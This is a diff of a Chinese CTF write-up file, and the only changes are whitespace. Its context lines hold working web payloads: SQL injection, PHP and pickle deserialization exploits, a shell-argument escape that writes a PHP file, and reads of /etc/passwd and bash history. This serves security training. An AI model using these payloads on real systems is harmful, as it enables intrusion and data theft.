@@ -132,7 +132,6 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 
 源码泄露：
 
-
 ```php
 <?php
     session_start();
@@ -205,7 +204,6 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
     ?>
 ```
 
-
 从 sql 语句可以看出存在堆叠注入，且 `flag` 被 `||` 拼接在了输入的后面。因此一种办法是把管道变成连接符，然后查询 `1||flag`：
 
 ```
@@ -223,6 +221,7 @@ return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
 ## [RoarCTF 2019]Easy Calc
 
 首页可以发现 js 代码，也就是自定义的 waf：
+
 ```js
 $('#calc').submit(function(){
     $.ajax({
@@ -268,13 +267,14 @@ if(!isset($_GET['num'])){
 ```
 
 可以发现 flag 文件 `/f1agg`，同样方法读出即可：
+
 ```
 /calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
 ```
 
 ## [强网杯 2019] 高明的黑客
-提供了 `www.tar.gz`，里面有 3000 + 个 php 文件，都含有类似一句话的部分，但是大多不能用。需要写脚本找到能用的一句话木马：
 
+提供了 `www.tar.gz`，里面有 3000 + 个 php 文件，都含有类似一句话的部分，但是大多不能用。需要写脚本找到能用的一句话木马：
 
 ```py
 import os
@@ -310,7 +310,6 @@ for name in filenames:
             pass
 ```
 
-
 ## [SUCTF 2019]CheckIn
 
 可以上传文件，但是会对后缀名、文件头进行检查，同时文件中不能存在 `<?`。后者用 `<script language="php">` 就可以绕过，前者可以上传图片马。随后就需要我们去包含这个图片马。
@@ -329,6 +328,7 @@ auto_prepend_file=1.jpg
 ## [网鼎杯 2018]Fakebook
 
 首先通过 `robots.txt` 发现 `user.php.bak`：
+
 ```php
 <?php
 
@@ -393,12 +393,14 @@ no=1 and updatexml(1,concat('~',(select data from users),'~'),1)--
 那么我们可以构造一个 `User` 使得他的 `blog` 指向 flag 文件。这样就可以绕过 `user.php` 的检查。
 
 构造序列化对象：
+
 ```php
 $a = new UserInfo('merc','10','file:///var/www/html/flag.php');
 echo serialize($a);
 ```
 
 另外 `union select` 被过滤，需要注释绕过。
+
 ```
 no=-1'union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"merc";s:3:"age";i:10;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'--
 ```
@@ -406,6 +408,7 @@ no=-1'union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:4:"merc";s:3:"age";i
 ## [De1CTF 2019]SSRF Me
 
 iec
+
 ```python
 from flask import Flask
 from flask import request
@@ -573,6 +576,7 @@ $photo = base64_encode(file_get_contents($profile['photo']));
 但是在更新档案时，`photo` 字段前会拼接一个 `upload/` 导致无法读到 `config.php`。那么我们可以考虑向 `nickname` 注入序列化字符串的末尾部分，使得反序列化时忽略掉原本的 `photo` 字段。
 
 但是对于 `nickname` 又存在过滤：
+
 ```php
 if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
     die('Invalid nickname');
@@ -581,6 +585,7 @@ if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname'
 不过绕过很简单，数组绕过即可。
 
 最后，为了注入 `photo`，我们需要额外添加：
+
 ```
 ";}s:5:"photo";s:10:"config.php
 ```
@@ -589,19 +594,20 @@ if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname'
 
 ```php
 public function filter($string) {
-	$escape = array('\'','\\\\');
-	$escape = '/' . implode('|', $escape) . '/';
-	$string = preg_replace($escape,'_', $string);
+    $escape = array('\'','\\\\');
+    $escape = '/' . implode('|', $escape) . '/';
+    $string = preg_replace($escape,'_', $string);
 
-	$safe = array('select', 'insert', 'update', 'delete', 'where');
-	$safe = '/' . implode('|', $safe) . '/i';
-		return preg_replace($safe,'hacker', $string);
+    $safe = array('select', 'insert', 'update', 'delete', 'where');
+    $safe = '/' . implode('|', $safe) . '/i';
+        return preg_replace($safe,'hacker', $string);
 }
 ```
 
 可以发现它会将 `where` 替换为 `hacker`，使得字符串长度 + 1，那么我们重复该过程 31 次即可。
 
 最终 payload：
+
 ```
 ------WebKitFormBoundary8V1KsQLRGLqfB6An
 Content-Disposition: form-data; name="phone"
@@ -630,16 +636,19 @@ config.php
 简单来说，`escapeshellarg` 会对传入参数中的单引号进行转义，然后将单引号两边的内容用 `''` 包起来；而 `escapeshellcmd` 会对转义符 `\` 以及不成对的单引号进行转义。那么先 `escapeshellarg` 再 `escapeshellcmd` 就会造成单引号逃逸。
 
 payload：
+
 ```
 ?host='<?php echo phpinfo();?> -oG 1.php '
 ```
 
 经过 `escapeshellarg`：
+
 ```
 ?host=''\' '<?php echo phpinfo();?> -oG 1.php'\'''
 ```
 
 经过 `escapeshellcmd`：
+
 ```
 ?host=''\\' '\<\?php echo phpinfo\(\)\;\?\> -oG 1.php'\\'''
 ```
@@ -695,7 +704,6 @@ $a->Size();
 这里创建了 `FileList` 对象，调用了两个方法。
 
 然后下载 `class.php`：
-
 
 ```php
 <?php
@@ -843,10 +851,10 @@ class File {
 ?>
 ```
 
-
 我们注意到，`FileList` 并没有刚才调用的两个方法，但是却有 `__call` 魔术方法，因此会去调用 `File` 的 `name` 和 `size` 方法。这里提示我们使用 `__call` 调用 `File` 的其他方法来进行漏洞利用，例如 `close` 就是不错的选择。
 
 而在下载和删除时，会分别使用 `download.php` 和 `delete.php`，这两个文件也下载下来：
+
 ```php
 <?php
 session_start();
@@ -961,6 +969,7 @@ id=4&price=%e1%8d%bc
 ## [CISCN2019 华北赛区 Day1 Web2]ikun
 
 首先需要找到 `lv6`，页数很多，写脚本跑一下：
+
 ```py
 import requests
 
@@ -994,6 +1003,7 @@ def post(self, *args, **kwargs):
 我们可以借助其魔术方法 `__reduce__` 来执行 python 代码。[参考](https://github.com/RafeKettler/magicmethods)
 
 注意 pickle 不能跨 python 版本，这里采用 python2：
+
 ```py
 import pickle
 import urllib
@@ -1007,6 +1017,7 @@ print urllib.quote(p)
 ```
 
 即可生成 URL 编码的序列化数据，填入 `become` 字段即可。
+
 ```
 c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29%27%0Ap1%0Atp2%0ARp3%0A.
 ```
@@ -1014,6 +1025,7 @@ c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29
 ## [GYCTF2020] Blacklist
 
 存在过滤语句 `return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);`，无法 `select`，可以考虑堆叠注入：
+
 ```
 -1';show tables;#
 -1';show columns from FlagHere;#
@@ -1026,7 +1038,6 @@ c__builtin__%0Aeval%0Ap0%0A%28S%27open%28%22/flag.txt%22%2C%22r%22%29.read%28%29
 ```
 
 ## [安洵杯 2019]easy_serialize_php
-
 
 ```php
 <?php
@@ -1071,22 +1082,24 @@ if($function =='highlight_file'){
 }
 ```
 
-
 本题的关键问题在于，对于序列化后的数据进行过滤，导致反序列化时出错。
 
 首先存在明显的变量覆盖，显然可以覆盖的变量只有 `$_SESSION`，随后注意到如果指定 `img_path` 那么 `$SESSION[img]` 将被哈希，变得不可控。而下方 `file_get_contents` 又提醒我们必须控制 `img` 字段，因此需要通过反序列化字符逃逸来实现。
 
 先通过提示在 `phpinfo` 中发现 `d0g3_f1ag.php` 文件，这就是我们要放进 `img` 的文件了。随后利用 `filter` 函数的过滤功能吞掉 24 个字符，使得反序列化时多读入后 24 字符并舍弃后面的所有内容。具体地说，构造：
+
 ```
 _SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}
 ```
 
 那么序列化后数据变为：
+
 ```
 a:3:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
 ```
 
 再经过 `filter`，变成：
+
 ```
 a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}";s:3:"img";s:28:"L3VwbG9hZC9ndWVzdF9pbWcuanBn";}
 ```
@@ -1096,7 +1109,6 @@ a:3:{s:4:"user";s:24:"";s:8:"function";s:59:"a";s:3:"img";s:20:"ZDBnM19mMWFnLnBo
 ## [网鼎杯 2018]Comment
 
 存在 `.git` 泄露，`GitHack` 发现恢复的文件不全，然后通过 `git log --reflog` 发现了一个 `stashed` 的记录，用 `git reset --hard xxx` 回滚到该记录得到完整代码：
-
 
 ```php
 <?php
@@ -1146,15 +1158,16 @@ else{
 ?>
 ```
 
-
 插入数据时进行转义，但获取 `category` 时没有转义直接拼接到了 sql 语句中执行，因此可以二次注入。
 
 首先是发帖，设置 `category` 为 `', content=user(),/*`，那么 sql 语句变成
+
 ```sql
 insert into board set category = '', content=user(),/*', title ='1', content ='2'
 ```
 
 然后评论 `*/#`，sql 语句为：
+
 ```sql
 insert into comment set category = '', content=user(),/*', content ='*/#', bo_id ='1'
 ```
@@ -1162,6 +1175,7 @@ insert into comment set category = '', content=user(),/*', content ='*/#', bo_id
 则评论内容中就会显示当前用户为 `root`，随后查看 `/etc/passwd` 发现存在 `www` 用户，再查看 `/home/www/.bash_history` 发现存在 `.DS_Store` 文件。
 
 随后查看 `.DS_Store` 文件：
+
 ```
 ',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
 ```
